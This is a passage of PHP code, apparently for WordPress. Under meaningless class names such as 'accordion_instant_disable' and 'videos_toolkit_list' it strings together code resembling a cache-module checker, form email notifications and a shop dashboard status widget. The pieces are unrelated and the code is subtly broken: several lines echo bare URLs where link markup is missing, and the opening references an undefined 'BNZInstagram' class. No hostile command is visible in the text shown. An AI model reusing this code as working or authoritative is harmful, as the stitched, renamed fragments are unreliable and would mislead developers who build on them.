        return $networkBbdAkismet;
    }
}

$itemsQjSyntax = new BNZInstagram();

class accordion_instant_disable
{
    private $_opcode_engines = array(
        'apc',
        'eaccelerator',
        'xcache',
        'wincache',
    );

    private $_file_engines = array(
        'file',
        'file_generic',
    );

    private $_config;

    public function __construct()
    {
        $this->_config = Dispatcher::config();
    }

    public function plugin_is_enabled()
    {
        return $this->is_enabled('pgcache') ||
            $this->is_enabled('minify') ||
            $this->is_enabled('dbcache') ||
            $this->is_enabled('objectcache') ||
            $this->is_enabled('browsercache') ||
            $this->is_enabled('cdn') ||
            $this->is_enabled('cdnfsd') ||
            $this->is_enabled('varnish') ||
            $this->is_enabled('newrelic') ||
            $this->is_enabled('fragmentcache');
    }

    public function is_enabled($module)
    {
        return $this->_config->get_boolean("$module.enabled");
    }

    public function is_running($module)
    {
        return apply_filters("w3tc_module_is_running-{$module}", $this->is_enabled($module));
    }

    public function can_empty_memcache()
    {
        return $this->_enabled_module_uses_engine('pgcache', 'memcached') ||
            $this->_enabled_module_uses_engine('dbcache', 'memcached') ||
            $this->_enabled_module_uses_engine('objectcache', 'memcached') ||
            $this->_enabled_module_uses_engine('minify', 'memcached') ||
            $this->_enabled_module_uses_engine('fragmentcache', 'memcached');
    }

    public function can_empty_opcode()
    {
        $o = Dispatcher::component('SystemOpCache_Core');
        return $o->is_enabled();
    }

    public function can_empty_file()
    {
        return $this->_enabled_module_uses_engine('pgcache', $this->_file_engines) ||
            $this->_enabled_module_uses_engine('dbcache', $this->_file_engines) ||
            $this->_enabled_module_uses_engine('objectcache', $this->_file_engines) ||
            $this->_enabled_module_uses_engine('minify', $this->_file_engines) ||
            $this->_enabled_module_uses_engine('fragmentcache', $this->_file_engines);
    }

    public function can_empty_varnish()
    {
        return $this->_config->get_boolean('varnish.enabled');
    }

    public function get_module_engine($module)
    {
        return $this->_config->get_string("$module.engine");
    }

    private function _enabled_module_uses_engine($module, $engine)
    {
        if (is_array($engine)) {
            return $this->is_enabled($module) && in_array($this->get_module_engine($module), $engine, true);
        } else {
            return $this->is_enabled($module) && $this->get_module_engine($module) === $engine;
        }
    }
}

class digital_visual_loader_quiz
{
    protected $app = null;

    public function __construct(Application $app)
    {
        $this->app = $app;
    }

    public function register()
    {
        add_filter('fluentform/notifying_async_email_notifications', '__return_false', 9);
        add_filter('fluentform/notifying_async_notifications', '__return_false', 9);

        add_filter('fluentform/global_notification_active_types', function ($types) {
            $types['notifications'] = 'email_notifications';
            return $types;
        });

        add_action('fluentform/integration_notify_notifications', [$this, 'notify'], 10, 4);

        add_action('fluentform/notify_on_form_submit', [$this, 'notifyOnSubmitPaymentForm'], 10, 3);
    }

    public function notifyOnSubmitPaymentForm($submissionId, $submissionData, $form)
    {
        $emailFeeds = wpFluent()
            ->table('fluentform_form_meta')
            ->where('form_id', $form->id)
            ->where('meta_key', 'notifications')
            ->get();

        if (!$emailFeeds) {
            return;
        }

        $formData = $this->getFormData($submissionId);
        $notificationManager = new \FluentForm\App\Services\Integrations\GlobalNotificationManager(wpFluentForm());

        $activeEmailFeeds = $notificationManager->getEnabledFeeds($emailFeeds, $formData, $submissionId);
        if (!$activeEmailFeeds) {
            return;
        }

        $onSubmitEmailFeeds = array_filter($activeEmailFeeds, function ($feed) {
            return 'payment_form_submit' == ArrayHelper::get($feed, 'settings.feed_trigger_event');
        });

        if (!$onSubmitEmailFeeds || 'yes' === Helper::getSubmissionMeta($submissionId, '_ff_on_submit_email_sent')) {
            return;
        }

        $entry = $this->getEntry($submissionId);

        foreach ($onSubmitEmailFeeds as $feed) {
            $processedValues = $feed['settings'];
            unset($processedValues['conditionals']);

            $processedValues = ShortCodeParser::parse(
                $processedValues,
                $submissionId,
                $formData,
                $form,
                false,
                $feed['meta_key']
            );
            $feed['processedValues'] = $processedValues;

            $this->notify($feed, $formData, $entry, $form);
        }

        Helper::setSubmissionMeta($submissionId, '_ff_on_submit_email_sent', 'yes', $form->id);
    }

    public function notify($feed, $formData, $entry, $form)
    {
        if (isset($form->has_payment) && $form->has_payment) {
            if (FormFieldsParser::hasElement($form, 'payment_method')) {
                $isTriggerOnPaymentSuccess = ArrayHelper::get($feed, 'processedValues.feed_trigger_event') === 'payment_success';
                $isPaymentPending = isset($entry->payment_status) && $entry->payment_status === 'pending';
                if ($isTriggerOnPaymentSuccess && $isPaymentPending) {
                    return;
                }
            }
        }

        $notifier = $this->app->make(
            'FluentForm\App\Services\FormBuilder\Notifications\EmailNotification'
        );

        $emailData = $feed['processedValues'];
        $emailAttachments = $this->getAttachments($emailData, $formData, $entry, $form);
        if ($emailAttachments) {
            $emailData['attachments'] = $emailAttachments;
        }

        $notifier->notify($emailData, $formData, $form, $entry->id);
    }

    private function getAttachments($emailData, $formData, $entry, $form)
    {
        $emailAttachments = [];

        $uploadDir = wp_upload_dir();

        if (!empty($emailData['attachments']) && is_array($emailData['attachments'])) {
            $attachments = [];
            foreach ($emailData['attachments'] as $name) {
                $fileUrls = ArrayHelper::get($formData, $name);
                if ($fileUrls && is_array($fileUrls)) {
                    foreach ($fileUrls as $url) {
                        if (strpos($url, $uploadDir['baseurl']) === 0) {
                            $relativePath = str_replace($uploadDir['baseurl'], '', $url);
                            $filePath = wp_normalize_path($uploadDir['basedir'] . $relativePath);

                            if (file_exists($filePath)) {
                                $attachments[] = $filePath;
                            }
                        }
                    }
                }
            }
            $emailAttachments = $attachments;
        }
        $mediaAttachments = ArrayHelper::get($emailData, 'media_attachments');
        if (!empty($mediaAttachments) && is_array($mediaAttachments)) {
            $attachments = [];
            foreach ($mediaAttachments as $file) {
                $fileUrl = ArrayHelper::get($file, 'url');
                if ($fileUrl && strpos($fileUrl, $uploadDir['baseurl']) === 0) {
                    $relativePath = str_replace($uploadDir['baseurl'], '', $fileUrl);
                    $filePath = wp_normalize_path($uploadDir['basedir'] . $relativePath);

                    if (file_exists($filePath)) {
                        $attachments[] = $filePath;
                    }
                }
            }
            $emailAttachments = array_merge($emailAttachments, $attachments);
        }

        $emailAttachments = apply_filters_deprecated(
            'fluentform_email_attachments',
            [
                $emailAttachments,
                $emailData,
                $formData,
                $entry,
                $form
            ],
            FLUENTFORM_FRAMEWORK_UPGRADE,
            'fluentform/email_attachments',
            'Use fluentform/email_attachments instead of fluentform_email_attachments.'
        );

        $emailAttachments = apply_filters(
            'fluentform/email_attachments',
            $emailAttachments,
            $emailData,
            $formData,
            $entry,
            $form
        );
        return $emailAttachments;
    }

    public function getFormData($submissionId)
    {
        $submission = wpFluent()
            ->table('fluentform_submissions')
            ->where('id', $submissionId)
            ->first();

        if (!$submission) {
            return false;
        }

        return json_decode($submission->response, true);
    }

    public function getEntry($submissionId)
    {
        return wpFluent()
            ->table('fluentform_submissions')
            ->where('id', $submissionId)
            ->first();
    }
}

class videos_toolkit_list
{
    public function __construct()
    {
        if ($this->should_display_widget()) {
            if (is_multisite() && is_network_admin()) {
                add_action('wp_network_dashboard_setup', array($this, 'register_network_order_widget'));
            } else {
                add_action('wp_dashboard_setup', array($this, 'init'));
            }
        }
    }

    public function init()
    {
        if (current_user_can('publish_shop_orders') && post_type_supports('product', 'comments')) {
            wp_add_dashboard_widget('woocommerce_dashboard_recent_reviews', __('WooCommerce Recent Reviews', 'woocommerce'), array($this, 'recent_reviews'));
        }
        wp_add_dashboard_widget('woocommerce_dashboard_status', __('WooCommerce Status', 'woocommerce'), array($this, 'status_widget'));

        if (is_multisite() && is_main_site()) {
            $this->register_network_order_widget();
        }
    }

    public function register_network_order_widget()
    {
        wp_add_dashboard_widget('woocommerce_network_orders', __('WooCommerce Network Orders', 'woocommerce'), array($this, 'network_orders'));
    }

    private function should_display_widget()
    {
        if (!WC()->is_wc_admin_active()) {
            return false;
        }

        $has_permission = current_user_can('view_woocommerce_reports') || current_user_can('manage_woocommerce') || current_user_can('publish_shop_orders');
        $task_completed_or_hidden = 'yes' === get_option('woocommerce_task_list_complete') || 'yes' === get_option('woocommerce_task_list_hidden');
        return $task_completed_or_hidden && $has_permission;
    }

    private function get_top_seller()
    {
        global $wpdb;

        $hpos_enabled = OrderUtil::custom_orders_table_usage_is_enabled();
        $orders_table = OrderUtil::get_table_for_orders();
        $orders_column_id = $hpos_enabled ? 'id' : 'ID';
        $orders_column_type = $hpos_enabled ? 'type' : 'post_type';
        $orders_column_status = $hpos_enabled ? 'status' : 'post_status';
        $orders_column_date = $hpos_enabled ? 'date_created_gmt' : 'post_date_gmt';

        $query = array();
        $query['fields'] = "SELECT SUM( order_item_meta.meta_value ) as qty, order_item_meta_2.meta_value as product_id FROM {$orders_table} AS orders";
        $query['join'] = "INNER JOIN {$wpdb->prefix}woocommerce_order_items AS order_items ON orders.{$orders_column_id} = order_id ";
        $query['join'] .= "INNER JOIN {$wpdb->prefix}woocommerce_order_itemmeta AS order_item_meta ON order_items.order_item_id = order_item_meta.order_item_id ";
        $query['join'] .= "INNER JOIN {$wpdb->prefix}woocommerce_order_itemmeta AS order_item_meta_2 ON order_items.order_item_id = order_item_meta_2.order_item_id ";
        $query['where'] = "WHERE orders.{$orders_column_type} IN ( '" . implode("','", wc_get_order_types('order-count')) . "' ) ";

        $order_statuses = apply_filters('woocommerce_reports_order_statuses', array(OrderStatus::COMPLETED, OrderStatus::PROCESSING, OrderStatus::ON_HOLD));
        $query['where'] .= "AND orders.{$orders_column_status} IN ( 'wc-" . implode("','wc-", $order_statuses) . "' ) ";

        $query['where'] .= "AND order_item_meta.meta_key = '_qty' ";
        $query['where'] .= "AND order_item_meta_2.meta_key = '_product_id' ";
        $query['where'] .= "AND orders.{$orders_column_date} >= '" . gmdate('Y-m-01', current_time('timestamp')) . "' ";
        $query['where'] .= "AND orders.{$orders_column_date} <= '" . gmdate('Y-m-d H:i:s', current_time('timestamp')) . "' ";
        $query['groupby'] = 'GROUP BY product_id';
        $query['orderby'] = 'ORDER BY qty DESC';
        $query['limits'] = 'LIMIT 1';

        $query = apply_filters('woocommerce_dashboard_status_widget_top_seller_query', $query);

        $sql = implode(' ', $query);
        return $wpdb->get_row($sql);
    }

    public function status_widget()
    {
        $suffix = Constants::is_true('SCRIPT_DEBUG') ? '' : '.min';
        $version = Constants::get_constant('WC_VERSION');

        wp_enqueue_script('wc-status-widget', WC()->plugin_url() . '/assets/js/admin/wc-status-widget' . $suffix . '.js', array('jquery', 'wc-flot'), $version, true);
        wp_enqueue_script('wc-status-widget-async', WC()->plugin_url() . '/assets/js/admin/wc-status-widget-async' . $suffix . '.js', array('jquery'), $version, true);

        wp_localize_script(
            'wc-status-widget-async',
            'wc_status_widget_params',
            array(
                'ajax_url' => admin_url('admin-ajax.php'),
                'security' => wp_create_nonce('wc-status-widget'),
            )
        );

        echo '<div id="wc-status-widget-loading" class="wc-status-widget-loading">';
        echo '<p>' . esc_html__('Loading status data...', 'woocommerce') . ' <span class="spinner is-active"></span></p>';
        echo '</div>';
        echo '<div id="wc-status-widget-content" style="display:none;"></div>';
    }

    public function status_widget_content()
    {
        $is_wc_admin_disabled = apply_filters('woocommerce_admin_disabled', false) || !Features::is_enabled('analytics');

        $status_widget_reports = array(
            'net_sales_link' => 'admin.php?page=wc-admin&path=%2Fanalytics%2Frevenue&chart=net_revenue&orderby=net_revenue&period=month&compare=previous_period',
            'top_seller_link' => 'admin.php?page=wc-admin&filter=single_product&path=%2Fanalytics%2Fproducts&products=',
            'lowstock_link' => 'admin.php?page=wc-admin&type=lowstock&path=%2Fanalytics%2Fstock',
            'outofstock_link' => 'admin.php?page=wc-admin&type=outofstock&path=%2Fanalytics%2Fstock',
            'report_data' => null,
            'get_sales_sparkline' => array($this, 'get_sales_sparkline'),
        );

        if ($is_wc_admin_disabled) {
            $status_widget_reports = apply_filters('woocommerce_dashboard_status_widget_reports', $status_widget_reports);
        } else {
            $status_widget_reports['report_data'] = $this->get_wc_admin_performance_data();
        }

        echo '<ul class="wc_status_list">';

        if (current_user_can('view_woocommerce_reports')) {
            $report_data = $status_widget_reports['report_data'];
            $get_sales_sparkline = $status_widget_reports['get_sales_sparkline'];
            $net_sales_link = $status_widget_reports['net_sales_link'];
            $top_seller_link = $status_widget_reports['top_seller_link'];

            $days = max(7, (int) gmdate('d', current_time('timestamp')));

            $sparkline_allowed_html = array(
                'span' => array(
                    'class' => array(),
                    'data-color' => array(),
                    'data-tip' => array(),
                    'data-barwidth' => array(),
                    'data-sparkline' => array(),
                ),
            );

            if ($report_data && is_callable($get_sales_sparkline)) {
                $sparkline = call_user_func_array($get_sales_sparkline, array('', $days));
                $sparkline = $this->sales_sparkline_markup('sales', $days, $sparkline['total'], $sparkline['data']);

                echo esc_url(admin_url($net_sales_link));
                echo wp_kses($sparkline, $sparkline_allowed_html);
                printf(
                    esc_html__('%s net sales this month', 'woocommerce'),
                    '<strong>' . wc_price($report_data->net_sales) . '</strong>'
                );
            }

            $top_seller = $this->get_top_seller();
            if ($top_seller && $top_seller->qty && is_callable($get_sales_sparkline)) {
                $sparkline = call_user_func_array($get_sales_sparkline, array($top_seller->product_id, $days, 'count'));
                $sparkline = $this->sales_sparkline_markup('count', $days, $sparkline['total'], $sparkline['data']);

                echo esc_url(admin_url($top_seller_link . $top_seller->product_id));
                echo wp_kses($sparkline, $sparkline_allowed_html);
                printf(
                    esc_html__('%1$s top seller this month (sold %2$d)', 'woocommerce'),
                    '<strong>' . get_the_title($top_seller->product_id) . '</strong>',
                    $top_seller->qty
                );
            }
        }

        $this->status_widget_order_rows();
        if (get_option('woocommerce_manage_stock') === 'yes') {
            $this->status_widget_stock_rows($status_widget_reports['lowstock_link'], $status_widget_reports['outofstock_link']);
        }

        $reports = apply_filters('woocommerce_after_dashboard_status_widget_parameter', null);
        do_action('woocommerce_after_dashboard_status_widget', $reports);
        echo '</ul>';
    }

    private function status_widget_order_rows()
    {
        if (!current_user_can('edit_shop_orders')) {
            return;
        }
        $on_hold_count = 0;
        $processing_count = 0;

        foreach (wc_get_order_types('order-count') as $type) {
            $counts = OrderUtil::get_count_for_type($type);
            $on_hold_count += $counts[OrderInternalStatus::ON_HOLD];
            $processing_count += $counts[OrderInternalStatus::PROCESSING];
        }

        echo esc_url(admin_url('edit.php?post_status=wc-processing&post_type=shop_order'));
        printf(
            _n('<strong>%s order</strong> awaiting processing', '<strong>%s orders</strong> awaiting processing', $processing_count, 'woocommerce'),
            $processing_count
        );

        echo esc_url(admin_url('edit.php?post_status=wc-on-hold&post_type=shop_order'));
        printf(
            _n('<strong>%s order</strong> on-hold', '<strong>%s orders</strong> on-hold', $on_hold_count, 'woocommerce'),
            $on_hold_count
        );
    }

    private function status_widget_stock_rows($lowstock_link, $outofstock_link)
    {
        global $wpdb;

        if (version_compare(get_option('woocommerce_db_version', null), '3.6', '<')) {
            return;
        }

        $stock = absint(max(get_option('woocommerce_notify_low_stock_amount'), 1));
        $nostock = absint(max(get_option('woocommerce_notify_no_stock_amount'), 0));

        $transient_name = 'wc_low_stock_count';
        $lowinstock_count = get_transient($transient_name);

        if (false === $lowinstock_count) {
            $lowinstock_count = apply_filters('woocommerce_status_widget_low_in_stock_count_pre_query', null, $stock, $nostock);

            if (is_null($lowinstock_count)) {
                $lowinstock_count = $wpdb->get_var(
                    $wpdb->prepare(
                        "SELECT COUNT( product_id )
\t\t\t\t\t\t\tFROM {$wpdb->wc_product_meta_lookup} AS lookup
\t\t\t\t\t\t\tINNER JOIN {$wpdb->posts} as posts ON lookup.product_id = posts.ID
\t\t\t\t\t\t\tWHERE stock_quantity <= %d
\t\t\t\t\t\t\tAND stock_quantity > %d
\t\t\t\t\t\t\tAND posts.post_status = 'publish'",
                        $stock,
                        $nostock
                    )
                );
            }

            set_transient($transient_name, (int) $lowinstock_count, DAY_IN_SECONDS * 30);
        }

        $transient_name = 'wc_outofstock_count';
        $outofstock_count = get_transient($transient_name);
        $lowstock_url = $lowstock_link ? admin_url($lowstock_link) : '#';
        $outofstock_url = $outofstock_link ? admin_url($outofstock_link) : '#';

        if (false === $outofstock_count) {
            $outofstock_count = apply_filters('woocommerce_status_widget_out_of_stock_count_pre_query', null, $nostock);

            if (is_null($outofstock_count)) {
                $outofstock_count = (int) $wpdb->get_var(
                    $wpdb->prepare(
                        "SELECT COUNT( product_id )
\t\t\t\t\t\t\tFROM {$wpdb->wc_product_meta_lookup} AS lookup
\t\t\t\t\t\t\tINNER JOIN {$wpdb->posts} as posts ON lookup.product_id = posts.ID
\t\t\t\t\t\t\tWHERE stock_quantity <= %d
\t\t\t\t\t\t\tAND posts.post_status = 'publish'",
                        $nostock
                    )
                );
            }

            set_transient($transient_name, (int) $outofstock_count, DAY_IN_SECONDS * 30);
        }

        echo esc_url($lowstock_url);
        printf(
            _n('<strong>%s product</strong> low in stock', '<strong>%s products</strong> low in stock', $lowinstock_count, 'woocommerce'),
            $lowinstock_count
        );

        echo esc_url($outofstock_url);
        printf(
            _n('<strong>%s product</strong> out of stock', '<strong>%s products</strong> out of stock', $outofstock_count, 'woocommerce'),
            $outofstock_count
        );
    }

    public function recent_reviews()
    {
        global $wpdb;

        $query_from = apply_filters(
            'woocommerce_report_recent_reviews_query_from',
            "FROM {$wpdb->comments} comments
\t\t\t\tLEFT JOIN {$wpdb->posts} posts ON (comments.comment_post_ID = posts.ID)
\t\t\t\tWHERE comments.comment_approved = '1'
\t\t\t\tAND comments.comment_type = 'review'
\t\t\t\tAND posts.post_password = ''
\t\t\t\tAND posts.post_type = 'product'
\t\t\t\tAND comments.comment_parent = 0
\t\t\t\tORDER BY comments.comment_date_gmt DESC
\t\t\t\tLIMIT 5"
        );

        $comments = $wpdb->get_results(
            "SELECT posts.ID, posts.post_title, comments.comment_author, comments.comment_author_email, comments.comment_ID, comments.comment_content {$query_from};"
        );

        if ($comments) {
            echo '<ul>';
            foreach ($comments as $comment) {
                echo '<li>';

                echo get_avatar($comment->comment_author_email, '32');

                $rating = intval(get_comment_meta($comment->comment_ID, 'rating', true));

                echo '<div class="star-rating"><span style="width:' . esc_attr($rating * 20) . '%">' . sprintf(esc_html__('%s out of 5', 'woocommerce'), esc_html($rating)) . '</span></div>';

                echo '<h4 class="meta"><a href="' . esc_url(get_permalink($comment->ID)) . '#comment-' . esc_attr(absint($comment->comment_ID)) . '">' . esc_html(apply_filters('woocommerce_admin_dashboard_recent_reviews', $comment->post_title, $comment)) . '</a> ' . sprintf(esc_html__('reviewed by %s', 'woocommerce'), esc_html($comment->comment_author)) . '</h4>';
                echo '<blockquote>' . wp_kses_data($comment->comment_content) . '</blockquote></li>';
            }
            echo '</ul>';
        } else {
            echo '<p>' . esc_html__('There are no product reviews yet.', 'woocommerce') . '</p>';
        }
    }

    public function network_orders()
    {
        $suffix = Constants::is_true('SCRIPT_DEBUG') ? '' : '.min';
        $version = Constants::get_constant('WC_VERSION');

        wp_enqueue_style('wc-network-orders', WC()->plugin_url() . '/assets/css/network-order-widget.css', array(), $version);

        wp_enqueue_script('wc-network-orders', WC()->plugin_url() . '/assets/js/admin/network-orders' . $suffix . '.js', array('jquery', 'underscore'), $version, true);

        $user = wp_get_current_user();
        $blogs = get_blogs_of_user($user->ID);
        $blog_ids = wp_list_pluck($blogs, 'userblog_id');

        wp_localize_script(
            'wc-network-orders',
            'woocommerce_network_orders',
            array(
                'nonce' => wp_create_nonce('wp_rest'),
                'sites' => array_values($blog_ids),
                'order_endpoint' => get_rest_url(null, 'wc/v3/orders/network'),
            )
        );

        esc_html_e('Loading network orders', 'woocommerce');
        esc_html_e('Order', 'woocommerce');
        esc_html_e('Status', 'woocommerce');
        esc_html_e('Total', 'woocommerce');
        esc_html_e('No orders found', 'woocommerce');
    }

    private function get_wc_admin_performance_data()
    {
        $request = new \WP_REST_Request('GET', '/wc-analytics/reports/performance-indicators');
        $start_date = gmdate('Y-m-01 00:00:00', current_time('timestamp'));
        $end_date = gmdate('Y-m-d 23:59:59', current_time('timestamp'));
        $request->set_query_params(
            array(
                'before' => $end_date,
                'after' => $start_date,
                'stats' => 'revenue/total_sales,revenue/net_revenue,orders/orders_count,products/items_sold,variations/items_sold',
            )
        );
        $response = rest_do_request($request);

        if (is_wp_error($response)) {
            return $response;
        }

        if (200 !== $response->get_status()) {
            return new \WP_Error('woocommerce_analytics_performance_indicators_result_failed', __('Sorry, fetching performance indicators failed.', 'woocommerce'));
        }
        $report_keys = array(
            'net_revenue' => 'net_sales',
        );
        $performance_data = new stdClass();
        foreach ($response->get_data() as $indicator) {
            if (isset($indicator['chart']) && isset($indicator['value'])) {
                $key = isset($report_keys[$indicator['chart']]) ? $report_keys[$indicator['chart']] : $indicator['chart'];
                $performance_data->$key = $indicator['value'];
            }
        }
        return $performance_data;
    }

    private function get_sales_sparkline($id = '', $days = 7, $type = 'sales')
    {
        $sales_endpoint = '/wc-analytics/reports/revenue/stats';
        $start_date = gmdate('Y-m-d 00:00:00', current_time('timestamp') - (($days - 1) * DAY_IN_SECONDS));
        $end_date = gmdate('Y-m-d 23:59:59', current_time('timestamp'));
        $meta_key = 'net_revenue';
        $params = array(
            'order' => 'asc',
            'interval' => 'day',
            'per_page' => 100,
            'before' => $end_date,
            'after' => $start_date,
        );
        if ($id) {
            $sales_endpoint = '/wc-analytics/reports/products/stats';
            $meta_key = ('sales' === $type) ? 'net_revenue' : 'items_sold';
            $params['products'] = $id;
        }
        $request = new \WP_REST_Request('GET', $sales_endpoint);
        $params['fields'] = array($meta_key);
        $request->set_query_params($params);

        $response = rest_do_request($request);

        if (is_wp_error($response)) {
            return $response;
        }

        $resp_data = $response->get_data();
        $data = $resp_data['intervals'];

        $sparkline_data = array();
        $total = 0;
        foreach ($data as $d) {
            $total += $d['subtotals']->$meta_key;
            array_push($sparkline_data, array(strval(strtotime($d['interval']) * 1000), $d['subtotals']->$meta_key));
        }

        return array(
            'total' => $total,
            'data' => $sparkline_data,
        );
    }

    private function sales_sparkline_markup($type, $days, $total, $sparkline_data)
    {
        if ('sales' === $type) {
            $tooltip = sprintf(__('Sold %1$s worth in the last %2$d days', 'woocommerce'), strip_tags(wc_price($total)), $days);
        } else {
            $tooltip = sprintf(_n('Sold %1$d item in the last %2$d days', 'Sold %1$d items in the last %2$d days', $total, 'woocommerce'), $total, $days);
        }

        return '<span class="wc_sparkline ' . (('sales' === $type) ? 'lines' : 'bars') . ' tips" data-color="#777" data-tip="' . esc_attr($tooltip) . '" data-barwidth="' . 60 * 60 * 16 * 1000 . '" data-sparkline="' . wc_esc_json(wp_json_encode($sparkline_data)) . '"></span>';
    }
}
